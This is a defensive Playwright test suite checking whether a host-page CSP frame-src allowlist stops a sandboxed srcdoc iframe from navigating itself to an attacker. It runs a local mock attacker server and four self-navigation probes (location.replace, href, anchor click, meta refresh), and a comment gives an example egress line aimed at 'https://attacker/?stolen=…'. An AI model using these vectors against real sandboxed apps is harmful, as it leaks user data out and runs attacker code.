import { expect, test } from '@playwright/test';
import { readFileSync } from 'node:fs';
import { type Server, createServer } from 'node:http';
import type { AddressInfo } from 'node:net';
import { join } from 'node:path';

import {
  SURFACE_SANDBOX_IFRAME_FLAGS,
  buildSandboxDocument,
} from '../../../packages/app/ui/components/SurfaceChannel/sandboxDocument';

/**
 * SELF-NAVIGATION posture.
 *
 * `sandbox="allow-scripts"` plus the child's `default-src 'none'` meta CSP
 * stop every *fetch* out of the frame (proved in sandbox.spec.ts), but
 * neither governs the frame navigating ITSELF.
 * `location.replace('https://attacker/?stolen=…')` is egress — the URL
 * carries the payload — and the response then runs unpinned code in a
 * script-enabled frame with no meta CSP. No `sandbox` token covers
 * self-navigation, CSP `default-src` governs fetches rather than
 * navigation, and `navigate-to` was dropped from CSP3.
 *
 * This file measures whether a `frame-src` allowlist on the HOST page
 * closes that hole, on every engine, with server-side ground truth:
 *
 *   - a real attacker HTTP server logs each hit, so "did bytes leave the
 *     device" is answered by the receiving end rather than inferred. An
 *     unresolvable `.invalid` host (what sandbox.spec.ts uses for the
 *     fetch probes) cannot separate "CSP blocked it" from "DNS failed",
 *     and that ambiguity is precisely what this experiment must avoid;
 *   - a real host server delivers the CSP as a response header, the way a
 *     deployment would, with a `<meta>`-delivered variant measured
 *     separately because the two are not interchangeable;
 *   - Config A (no CSP at all) is the positive control. A probe that fails
 *     to navigate under Config A proves nothing about CSP, so it is
 *     reported as an ineffective probe, never as "blocked";
 *   - every probe announces itself to the parent before navigating, so a
 *     frame that never loaded is never mistaken for a blocked navigation;
 *   - each blocking config is paired with an allowlist-the-attacker
 *     control, so a "blocked" reading has to be `frame-src` source
 *     matching and cannot be some unrelated side effect of the page
 *     carrying a CSP at all.
 *
 * A successful navigation destroys the frame, so every probe runs in its
 * own test, on its own page, in its own frame.
 */

const shellRoot = join(__dirname, '..', '..', '..', 'packages/surface-shell');

let shellJs = '';
let shellCss = '';

type Hit = { path: string; at: number };

let hostServer: Server;
let attackerServer: Server;
let hostOrigin = '';
let attackerOrigin = '';
const hits: Hit[] = [];

function listen(server: Server): Promise<number> {
  return new Promise((resolve) => {
    server.listen(0, '127.0.0.1', () =>
      resolve((server.address() as AddressInfo).port)
    );
  });
}

function close(server: Server): Promise<void> {
  return new Promise((resolve) => server.close(() => resolve()));
}

function escapeAttribute(value: string): string {
  return value
    .replace(/&/g, '&amp;')
    .replace(/</g, '&lt;')
    .replace(/"/g, '&quot;');
}

/**
 * Host page. `?header=` sets a real `Content-Security-Policy` response
 * header; `?meta=` embeds the same policy as a `<meta http-equiv>`
 * instead. Only `frame-src` is ever set, so the frame directive is the
 * single variable under test and nothing else about the page changes
 * between configurations.
 */
function hostPageHtml(metaPolicy: string | null): string {
  return [
    '<!doctype html>',
    '<html>',
    '<head>',
    '<meta charset="utf-8" />',
    metaPolicy
      ? `<meta http-equiv="Content-Security-Policy" content="${escapeAttribute(metaPolicy)}" />`
      : '',
    '<title>sandbox host</title>',
    '</head>',
    '<body style="margin:0"></body>',
    '</html>',
  ].join('\n');
}

test.beforeAll(async () => {
  try {
    shellJs = readFileSync(join(shellRoot, 'dist/surface-shell.js'), 'utf8');
    shellCss = readFileSync(join(shellRoot, 'dist/surface-shell.css'), 'utf8');
  } catch {
    throw new Error(
      'shell artifact missing — run `pnpm build:surface-shell` at the repo root first'
    );
  }

  attackerServer = createServer((req, res) => {
    hits.push({ path: req.url ?? '', at: Date.now() });
    res.writeHead(200, { 'content-type': 'text/html; charset=utf-8' });
    res.end(
      '<!doctype html><html><head><title>exfil-landed</title></head><body id="exfil-landed">exfil-landed</body></html>'
    );
  });
  const attackerPort = await listen(attackerServer);
  // a different host AND port from the host page, so neither `'self'` nor
  // a same-origin allowlist can accidentally match it
  attackerOrigin = `http://localhost:${attackerPort}`;

  hostServer = createServer((req, res) => {
    const url = new URL(req.url ?? '/', 'http://127.0.0.1');
    const headerPolicy = url.searchParams.get('header');
    const metaPolicy = url.searchParams.get('meta');
    const headers: Record<string, string> = {
      'content-type': 'text/html; charset=utf-8',
      'cache-control': 'no-store',
    };
    if (headerPolicy) headers['content-security-policy'] = headerPolicy;
    res.writeHead(200, headers);
    res.end(hostPageHtml(metaPolicy));
  });
  const hostPort = await listen(hostServer);
  hostOrigin = `http://127.0.0.1:${hostPort}`;
});

test.afterAll(async () => {
  await close(attackerServer);
  await close(hostServer);
});

/**
 * Every probe announces itself to the parent BEFORE navigating. Without
 * that signal a frame that never loaded at all is indistinguishable from
 * a frame whose navigation was blocked, and reporting the former as
 * "blocked" would be exactly the false containment claim this file exists
 * to rule out.
 */
const ARM = `parent.postMessage(JSON.stringify({ type: 'probe-armed' }), '*');`;

/** Self-navigation vectors. Each returns bundle source for one vector. */
const NAV_PROBES: Record<string, (target: string) => string> = {
  'nav-replace': (target) =>
    `${ARM} location.replace(${JSON.stringify(target)});`,
  'nav-href': (target) => `${ARM} location.href = ${JSON.stringify(target)};`,
  'nav-anchor': (target) => `
    ${ARM}
    var a = document.createElement('a');
    a.href = ${JSON.stringify(target)};
    a.target = '_self';
    a.textContent = 'go';
    document.body.appendChild(a);
    a.click();
  `,
  // written while the parser is still open, so it inserts rather than
  // re-opening (and wiping) the document
  'nav-meta': (target) => `
    ${ARM}
    document.write(
      '<meta http-equiv="refresh" content="0;url=' + ${JSON.stringify(target)} + '">'
    );
  `,
};

const PROBE_NAMES = Object.keys(NAV_PROBES);

/** A bundle that only proves the srcdoc frame loaded and ran at all (Q2). */
const ALIVE_BUNDLE = `
  parent.postMessage(JSON.stringify({ type: 'srcdoc-alive' }), '*');
  document.body.insertAdjacentHTML(
    'beforeend', '<div id="srcdoc-alive">alive</div>'
  );
`;

type Delivery = 'none' | 'header' | 'meta';

type HostConfig = {
  /** stable id used in test titles, expectation keys and the matrix */
  id: string;
  delivery: Delivery;
  /** built lazily: the attacker allowlist needs a runtime port */
  policy: () => string | null;
};

const HOST_CONFIGS: HostConfig[] = [
  // Config A: production reality today — tlon-web sets no CSP at all.
  { id: 'A/no-csp', delivery: 'none', policy: () => null },

  // Config B: restrictive frame-src allowlists, delivered as a header.
  {
    id: 'B/header/frame-src-none',
    delivery: 'header',
    policy: () => "frame-src 'none'",
  },
  {
    id: 'B/header/frame-src-self',
    delivery: 'header',
    policy: () => "frame-src 'self'",
  },
  {
    // the realistic deployment shape: an explicit allowlist that does not
    // contain the attacker
    id: 'B/header/frame-src-other-origin',
    delivery: 'header',
    policy: () => 'frame-src https://example.com',
  },
  {
    // mechanism control: allowlist the attacker itself. Navigation
    // succeeding here, under the same delivery mechanism, is what proves
    // the blocking above is frame-src source matching rather than some
    // side effect of the page carrying any CSP at all.
    id: 'B/header/frame-src-attacker-origin',
    delivery: 'header',
    policy: () => `frame-src ${attackerOrigin}`,
  },

  // Config B, meta-delivered. Reported separately from the header
  // variant: the two are not guaranteed to behave alike, and conflating
  // them would be a defect in the experiment.
  {
    id: 'B/meta/frame-src-none',
    delivery: 'meta',
    policy: () => "frame-src 'none'",
  },
  {
    id: 'B/meta/frame-src-attacker-origin',
    delivery: 'meta',
    policy: () => `frame-src ${attackerOrigin}`,
  },
];

function hostUrlFor(config: HostConfig): string {
  const policy = config.policy();
  if (!policy) return `${hostOrigin}/host.html`;
  return `${hostOrigin}/host.html?${config.delivery}=${encodeURIComponent(policy)}`;
}

/**
 * NOT-BLOCKED        the request reached the attacker server AND the frame
 *                    committed its response — full compromise
 * BLOCKED-LATE       the request reached the attacker server but the frame
 *                    did not commit — the URL, and any payload in it,
 *                    still left the device
 * BLOCKED-PREFLIGHT  the attacker server saw nothing — nothing left
 * FRAME-NEVER-LOADED the sandbox frame never ran the probe, so this cell
 *                    says nothing about navigation
 */
type Classification =
  | 'NOT-BLOCKED'
  | 'BLOCKED-LATE'
  | 'BLOCKED-PREFLIGHT'
  | 'FRAME-NEVER-LOADED';

type Observation = {
  config: string;
  probe: string;
  /** did the sandbox frame load and run the probe at all? */
  armed: boolean;
  /** requests the attacker server actually received on this probe's path */
  serverHits: number;
  /** did the frame commit the attacker document? */
  committed: boolean;
  /** is the frame still the sandbox document afterwards? */
  frameStillSrcdoc: boolean;
  classification: Classification;
  frameUrls: string[];
  netRequests: string[];
  netResponses: string[];
  netFailures: string[];
};

const observations: Observation[] = [];
const srcdocLoads: { config: string; loaded: boolean; frameUrls: string[] }[] =
  [];

async function mountOn(
  page: import('@playwright/test').Page,
  hostUrl: string,
  doc: string
) {
  await page.goto(hostUrl);
  await page.evaluate(
    ({ doc, flags }) => {
      const w = window as unknown as { __received: unknown[] };
      w.__received = [];
      window.addEventListener('message', (event) => {
        let data: unknown = event.data;
        if (typeof data === 'string') {
          try {
            data = JSON.parse(data);
          } catch {
            return;
          }
        }
        w.__received.push(data);
      });
      const iframe = document.createElement('iframe');
      iframe.setAttribute('sandbox', flags);
      iframe.setAttribute('srcdoc', doc);
      iframe.style.width = '400px';
      iframe.style.height = '300px';
      iframe.style.border = '0';
      document.body.appendChild(iframe);
    },
    { doc, flags: SURFACE_SANDBOX_IFRAME_FLAGS }
  );
}

function sawMessage(page: import('@playwright/test').Page, type: string) {
  return page.evaluate(
    (type) =>
      ((window as unknown as { __received: unknown[] }).__received ?? []).some(
        (m) => (m as { type?: string })?.type === type
      ),
    type
  );
}

async function observeNavProbe(
  page: import('@playwright/test').Page,
  config: HostConfig,
  probe: string
): Promise<Observation> {
  const target = `${attackerOrigin}/${probe}`;
  const netRequests: string[] = [];
  const netResponses: string[] = [];
  const netFailures: string[] = [];
  page.on('request', (r) => netRequests.push(r.url()));
  page.on('response', (r) => netResponses.push(r.url()));
  page.on('requestfailed', (r) => netFailures.push(r.url()));

  const before = hits.length;
  const doc = buildSandboxDocument({
    shellJs,
    shellCss,
    bundleSource: NAV_PROBES[probe](target),
  });
  await mountOn(page, hostUrlFor(config), doc);

  // settle: stop early once the attacker server has been hit or the frame
  // has committed, otherwise wait out the full window before concluding
  // that nothing happened
  const deadline = Date.now() + 2500;
  while (Date.now() < deadline) {
    const hit = hits.slice(before).some((h) => h.path === `/${probe}`);
    const committed = page.frames().some((f) => f.url().startsWith(target));
    if (hit || committed) break;
    await page.waitForTimeout(100);
  }
  // give a landed request time to commit (or to be refused at commit)
  await page.waitForTimeout(400);

  const armed = await sawMessage(page, 'probe-armed');
  const frameUrls = page.frames().map((f) => f.url());
  const serverHits = hits
    .slice(before)
    .filter((h) => h.path === `/${probe}`).length;
  const committed = frameUrls.some((u) => u.startsWith(target));

  const observation: Observation = {
    config: config.id,
    probe,
    armed,
    serverHits,
    committed,
    frameStillSrcdoc: frameUrls.includes('about:srcdoc'),
    classification: !armed
      ? 'FRAME-NEVER-LOADED'
      : serverHits > 0 && committed
        ? 'NOT-BLOCKED'
        : serverHits > 0
          ? 'BLOCKED-LATE'
          : 'BLOCKED-PREFLIGHT',
    frameUrls,
    netRequests: netRequests.filter((u) => u.startsWith(target)),
    netResponses: netResponses.filter((u) => u.startsWith(target)),
    netFailures: netFailures.filter((u) => u.startsWith(target)),
  };
  observations.push(observation);
  return observation;
}

async function observeSrcdocLoad(
  page: import('@playwright/test').Page,
  config: HostConfig
) {
  const doc = buildSandboxDocument({
    shellJs,
    shellCss,
    bundleSource: ALIVE_BUNDLE,
  });
  await mountOn(page, hostUrlFor(config), doc);

  const deadline = Date.now() + 2500;
  let loaded = false;
  while (Date.now() < deadline) {
    loaded = await sawMessage(page, 'srcdoc-alive');
    if (loaded) break;
    await page.waitForTimeout(100);
  }
  const frameUrls = page.frames().map((f) => f.url());
  srcdocLoads.push({ config: config.id, loaded, frameUrls });
  return { loaded, frameUrls };
}

/**
 * MEASURED behaviour, identical on chromium 136, firefox 137 and webkit
 * 18.4. Nothing here is aspirational: where a vector is not contained the
 * expectation says so, so that a future engine change that quietly opens
 * or closes a hole fails this suite instead of passing it.
 *
 * All four navigation vectors behave identically within each config, so
 * the expectation is per-config; a future per-vector divergence fails.
 */
const EXPECTED: Record<
  string,
  {
    /** Q2: does the about:srcdoc sandbox frame load under this policy? */
    srcdocLoads: boolean;
    navigation: Classification;
    note: string;
  }
> = {
  // KNOWN GAP, and the positive control for the whole file: with no CSP
  // on the host page — today's production posture — all four
  // self-navigation vectors reach the attacker and commit its response.
  // `sandbox="allow-scripts"` and the child's `default-src 'none'` do not
  // touch this.
  'A/no-csp': {
    srcdocLoads: true,
    navigation: 'NOT-BLOCKED',
    note: 'no host CSP: self-navigation exfiltrates and the frame runs attacker code',
  },
  'B/header/frame-src-none': {
    srcdocLoads: true,
    navigation: 'BLOCKED-PREFLIGHT',
    note: 'srcdoc is exempt from frame-src, so the sandbox frame still loads',
  },
  'B/header/frame-src-self': {
    srcdocLoads: true,
    navigation: 'BLOCKED-PREFLIGHT',
    note: "'self' does not match the attacker origin",
  },
  'B/header/frame-src-other-origin': {
    srcdocLoads: true,
    navigation: 'BLOCKED-PREFLIGHT',
    note: 'explicit allowlist that excludes the attacker',
  },
  // control: same delivery, same directive, attacker allowlisted — the
  // navigation goes through, which is what makes the three cells above
  // attributable to frame-src source matching
  'B/header/frame-src-attacker-origin': {
    srcdocLoads: true,
    navigation: 'NOT-BLOCKED',
    note: 'control: an allowlisted origin is still reachable',
  },
  'B/meta/frame-src-none': {
    srcdocLoads: true,
    navigation: 'BLOCKED-PREFLIGHT',
    note: 'meta-delivered policy enforces the same as the header',
  },
  'B/meta/frame-src-attacker-origin': {
    srcdocLoads: true,
    navigation: 'NOT-BLOCKED',
    note: 'control for the meta delivery path',
  },
};

/**
 * Engine divergence, measured. When frame-src refuses the navigation,
 * Chromium commits an error page INTO the sandbox frame, destroying the
 * running mini-app; Firefox and WebKit leave the frame on its srcdoc
 * document and the app keeps running. Neither leaks, but a hostile bundle
 * can self-destruct its own surface on Chromium.
 */
const BLOCKED_NAV_KEEPS_SRCDOC_FRAME: Record<string, boolean> = {
  chromium: false,
  firefox: true,
  webkit: true,
};

for (const config of HOST_CONFIGS) {
  const expected = EXPECTED[config.id];

  test.describe(config.id, () => {
    // Q2: a frame-src allowlist strict enough to stop navigation would be
    // useless if it also stopped our own srcdoc frame from loading.
    test('srcdoc sandbox frame loads and runs', async ({ page }) => {
      const result = await observeSrcdocLoad(page, config);
      expect(result.loaded).toBe(expected.srcdocLoads);
    });

    for (const probe of PROBE_NAMES) {
      test(`self-navigation: ${probe}`, async ({ page }) => {
        const result = await observeNavProbe(page, config, probe);

        // the frame must have actually run the probe, or the cell is
        // meaningless
        expect(result.armed).toBe(true);
        expect(result.classification).toBe(expected.navigation);

        if (expected.navigation === 'NOT-BLOCKED') {
          // documents the gap concretely: bytes reached the attacker and
          // the frame is now showing the attacker's document
          expect(result.serverHits).toBeGreaterThan(0);
          expect(result.committed).toBe(true);
          expect(result.netResponses.length).toBeGreaterThan(0);
        } else {
          // pre-flight, not late: the attacker server saw nothing at all,
          // and no request for the target was even attempted
          expect(result.serverHits).toBe(0);
          expect(result.committed).toBe(false);
          expect(result.netRequests).toEqual([]);
          expect(result.netResponses).toEqual([]);
          expect(result.frameStillSrcdoc).toBe(
            BLOCKED_NAV_KEEPS_SRCDOC_FRAME[test.info().project.name]
          );
        }
      });
    }
  });
}

test.afterAll(() => {
  const engine = test.info().project.name;
  const rows = [
    `\n=== sandbox self-navigation matrix (${engine}) ===`,
    `srcdoc frame loads (Q2):`,
    ...srcdocLoads.map(
      (s) => `  ${s.config.padEnd(36)} loaded=${s.loaded}  ${s.frameUrls[1]}`
    ),
    `navigation probes (Q1/Q3):`,
    ...observations.map(
      (o) =>
        `  ${o.config.padEnd(36)} ${o.probe.padEnd(12)} ` +
        `armed=${String(o.armed).padEnd(5)} attackerServerHits=${o.serverHits} ` +
        `committed=${String(o.committed).padEnd(5)} ${o.classification.padEnd(18)} ` +
        `frame=${o.frameUrls[1]}`
    ),
  ];
  // the suite doubles as the evidence artifact for the posture review
  // eslint-disable-next-line no-console
  console.log(rows.join('\n'));
});
